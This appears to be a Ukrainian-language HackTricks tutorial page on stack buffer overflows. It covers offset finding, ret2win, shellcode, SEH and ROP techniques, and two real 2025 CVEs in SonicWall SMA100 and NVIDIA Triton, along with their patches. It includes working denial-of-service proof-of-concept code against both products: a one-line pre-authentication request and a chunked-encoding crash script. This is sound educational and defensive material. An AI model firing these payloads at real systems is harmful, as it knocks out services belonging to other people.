# Stack Overflow

{{#include ../../banners/hacktricks-training.md}}

## Що таке Stack Overflow

**stack overflow** — це вразливість, яка виникає, коли програма записує у stack більше даних, ніж для нього виділено. Ці зайві дані **перезапишуть сусідню ділянку пам'яті**, що призведе до пошкодження коректних даних, порушення потоку управління та, можливо, виконання шкідливого коду. Ця проблема часто виникає через використання небезпечних функцій, які не виконують перевірку меж вхідних даних.

Головна проблема такого перезапису в тому, що **saved instruction pointer (EIP/RIP)** та **saved base pointer (EBP/RBP)** для повернення до попередньої функції **зберігаються на stack**. Отже, атакуючий зможе їх перезаписати і **контролювати потік виконання програми**.

Зазвичай вразливість виникає через те, що функція **копіює у stack більше байтів, ніж для неї виділено**, тим самим перезаписуючи інші частини stack.

Деякі поширені функції, вразливі до цього: **`strcpy`, `strcat`, `sprintf`, `gets`**... Також функції на кшталт **`fgets`**, **`read`** та **`memcpy`**, які приймають **аргумент довжини**, можуть використовуватися вразливо, якщо вказана довжина перевищує виділений обсяг.

Наприклад, наступні функції можуть бути вразливими:
```c
void vulnerable() {
char buffer[128];
printf("Enter some text: ");
gets(buffer); // This is where the vulnerability lies
printf("You entered: %s\n", buffer);
}
```
### Знаходження зсувів для Stack Overflows

Найпоширеніший спосіб знайти Stack Overflows — подати дуже великий вхід з `A` (наприклад `python3 -c 'print("A"*1000)'`) і очікувати `Segmentation Fault`, яке вказує, що **було спробовано звернутися до адреси `0x41414141`**.

Крім того, коли ви виявили, що існує Stack Overflow вразливість, вам потрібно знайти зсув, необхідний для того, щоб можна було **перезаписати адресу повернення**. Для цього зазвичай використовують **De Bruijn sequence.** Для заданого алфавіту розміру _k_ і підпослідовностей довжини _n_ це є **циклічна послідовність, у якій кожна можлива підпослідовність довжини _n_ з'являється рівно один раз** як суцільна підпослідовність.

Таким чином, замість того, щоб вручну визначати, який зсув потрібен для контролю EIP, можна використати як наповнювач одну з таких послідовностей і потім знайти зсув байтів, які в кінці перезаписали її.

Для цього можна використати **pwntools**:
```python
from pwn import *

# Generate a De Bruijn sequence of length 1000 with an alphabet size of 256 (byte values)
pattern = cyclic(1000)

# This is an example value that you'd have found in the EIP/IP register upon crash
eip_value = p32(0x6161616c)
offset = cyclic_find(eip_value)  # Finds the offset of the sequence in the De Bruijn pattern
print(f"The offset is: {offset}")
```
або **GEF**:
```bash
#Patterns
pattern create 200 #Generate length 200 pattern
pattern search "avaaawaa" #Search for the offset of that substring
pattern search $rsp #Search the offset given the content of $rsp
```
## Exploiting Stack Overflows

Під час overflow (припустивши, що розмір overflow достатньо великий) ви зможете **overwrite** значення локальних змінних у stack, поки не досягнете збережених **EBP/RBP and EIP/RIP (or even more)**.\
Найпоширеніший спосіб зловживання цим типом вразливості — **modifying the return address**, тож коли функція завершиться, **control flow буде перенаправлений куди вказано в цьому вказівнику**.

Однак в інших сценаріях може бути достатньо просто **overwriting some variables values in the stack** (наприклад у простих CTF challenges).

### Ret2win

У цьому типі CTF challenges у бінарі є **function** всередині, яка **ніколи не викликається**, і яку **потрібно викликати, щоб виграти**. Для таких завдань потрібно знайти **offset to overwrite the return address** та **find the address of the function** для виклику (зазвичай [**ASLR**](../common-binary-protections-and-bypasses/aslr/index.html) буде вимкнено), щоб коли вразлива функція повернеться, прихована функція була викликана:


{{#ref}}
ret2win/
{{#endref}}

### Stack Shellcode

У цьому сценарії атакуючий може розмістити shellcode в stack і використати контрольований EIP/RIP, щоб перейти до shellcode і виконати довільний код:


{{#ref}}
stack-shellcode/
{{#endref}}

### Windows SEH-based exploitation (nSEH/SEH)

На 32-bit Windows overflow може перезаписати ланцюжок Structured Exception Handler (SEH) замість збереженої return address. Експлуатація зазвичай замінює SEH pointer на POP POP RET gadget та використовує 4-байтне поле nSEH для короткого стрибка, щоб повернутися в великий буфер, де знаходиться shellcode. Поширений патерн — короткий jmp в nSEH, який потрапляє на 5-байтний near jmp, розміщений безпосередньо перед nSEH, щоб відскочити на сотні байтів назад до початку payload.


{{#ref}}
windows-seh-overflow.md
{{#endref}}

### ROP & Ret2... techniques

Ця техніка є фундаментальною основою для обходу основного захисту попереднього підходу: **No executable stack (NX)**. Вона також дозволяє реалізувати кілька інших технік (ret2lib, ret2syscall...), які врешті виконують довільні команди, зловживаючи існуючими інструкціями в бінарі:


{{#ref}}
../rop-return-oriented-programing/
{{#endref}}

## Heap Overflows

Overflow трапляється не завжди в stack, він також може бути в **heap**, наприклад:


{{#ref}}
../libc-heap/heap-overflow.md
{{#endref}}

## Типи захистів

Існує кілька механізмів захисту, що намагаються запобігти експлуатації вразливостей — перегляньте їх у:


{{#ref}}
../common-binary-protections-and-bypasses/
{{#endref}}

### Real-World Example: CVE-2025-40596 (SonicWall SMA100)

Яскрава демонстрація того, чому **`sscanf` should never be trusted for parsing untrusted input** з’явилася у 2025 році в SonicWall SMA100 SSL-VPN appliance.
Вразлива рутина всередині `/usr/src/EasyAccess/bin/httpd` намагається витягнути версію та endpoint з будь-якого URI, що починається з `/__api__/`:
```c
char version[3];
char endpoint[0x800] = {0};
/* simplified proto-type */
sscanf(uri, "%*[^/]/%2s/%s", version, endpoint);
```
1. Перша конверсія (`%2s`) безпечно зберігає **два** байти в `version` (наприклад `"v1"`).
2. Друга конверсія (`%s`) **не має специфікатора довжини**, тому `sscanf` продовжуватиме копіювання **до першого байта NUL**.
3. Оскільки `endpoint` розташований на **stack** і має довжину **0x800 байтів**, передача шляху довшого за 0x800 байтів пошкоджує все, що знаходиться після буфера ‑ включно з **stack canary** та **saved return address**.

Достатньо single-line proof-of-concept, щоб спричинити crash **before authentication**:
```python
import requests, warnings
warnings.filterwarnings('ignore')
url = "https://TARGET/__api__/v1/" + "A"*3000
requests.get(url, verify=False)
```
Навіть незважаючи на те, що stack canaries переривають процес, атакуючий все одно отримує примітив **Denial-of-Service** (а при додаткових information leaks — можливе виконання коду). Урок простий:

* Завжди вказуйте **максимальну ширину поля** (наприклад `%511s`).
* Надавайте перевагу безпечнішим альтернативам, таким як `snprintf`/`strncpy_s`.

### Реальний приклад: CVE-2025-23310 & CVE-2025-23311 (NVIDIA Triton Inference Server)

NVIDIA’s Triton Inference Server (≤ v25.06) містив кілька **stack-based overflows**, до яких можна було дістатися через його HTTP API.
Вразливий патерн багаторазово з'являвся в `http_server.cc` та `sagemaker_server.cc`:
```c
int n = evbuffer_peek(req->buffer_in, -1, NULL, NULL, 0);
if (n > 0) {
/* allocates 16 * n bytes on the stack */
struct evbuffer_iovec *v = (struct evbuffer_iovec *)
alloca(sizeof(struct evbuffer_iovec) * n);
...
}
```
1. `evbuffer_peek` (libevent) повертає **кількість внутрішніх сегментів буфера**, що складають поточне тіло HTTP-запиту.
2. Кожен сегмент призводить до виділення **16-byte** `evbuffer_iovec` на **stack** через `alloca()` — **без будь-якої верхньої межі**.
3. Зловживаючи **HTTP _chunked transfer-encoding_**, клієнт може змусити запит розбитися на **сотні тисяч 6-byte шматків** (`"1\r\nA\r\n"`). Це призводить до необмеженого зростання `n`, поки **stack** не буде вичерпано.

#### Доказ концепції (DoS)
```python
#!/usr/bin/env python3
import socket, sys

def exploit(host="localhost", port=8000, chunks=523_800):
s = socket.create_connection((host, port))
s.sendall((
f"POST /v2/models/add_sub/infer HTTP/1.1\r\n"
f"Host: {host}:{port}\r\n"
"Content-Type: application/octet-stream\r\n"
"Inference-Header-Content-Length: 0\r\n"
"Transfer-Encoding: chunked\r\n"
"Connection: close\r\n\r\n"
).encode())

for _ in range(chunks):                  # 6-byte chunk ➜ 16-byte alloc
s.send(b"1\r\nA\r\n")            # amplification factor ≈ 2.6x
s.sendall(b"0\r\n\r\n")               # end of chunks
s.close()

if __name__ == "__main__":
exploit(*sys.argv[1:])
```
A ~3 MB request is enough to overwrite the saved return address and **crash** the daemon on a default build.

#### Патч і пом'якшення
Реліз 25.07 замінює небезпечне виділення в стеку на **heap-backed `std::vector`** та коректно обробляє `std::bad_alloc`:
```c++
std::vector<evbuffer_iovec> v_vec;
try {
v_vec = std::vector<evbuffer_iovec>(n);
} catch (const std::bad_alloc &e) {
return TRITONSERVER_ErrorNew(TRITONSERVER_ERROR_INVALID_ARG, "alloc failed");
}
struct evbuffer_iovec *v = v_vec.data();
```
Уроки:
* Ніколи не викликайте `alloca()` з розмірами, контрольованими атакуючим.
* Запити з chunked кодуванням можуть радикально змінювати структуру буферів на сервері.
* Перевіряйте / обмежуйте будь-яке значення, отримане з введення клієнта, *перед* використанням його у виділеннях пам'яті.

## Посилання
* [watchTowr Labs – Stack Overflows, Heap Overflows and Existential Dread (SonicWall SMA100)](https://labs.watchtowr.com/stack-overflows-heap-overflows-and-existential-dread-sonicwall-sma100-cve-2025-40596-cve-2025-40597-and-cve-2025-40598/)
* [Trail of Bits – Uncovering memory corruption in NVIDIA Triton](https://blog.trailofbits.com/2025/08/04/uncovering-memory-corruption-in-nvidia-triton-as-a-new-hire/)
* [HTB: Rainbow – SEH overflow to RCE over HTTP (0xdf)](https://0xdf.gitlab.io/2025/08/07/htb-rainbow.html)

{{#include ../../banners/hacktricks-training.md}}
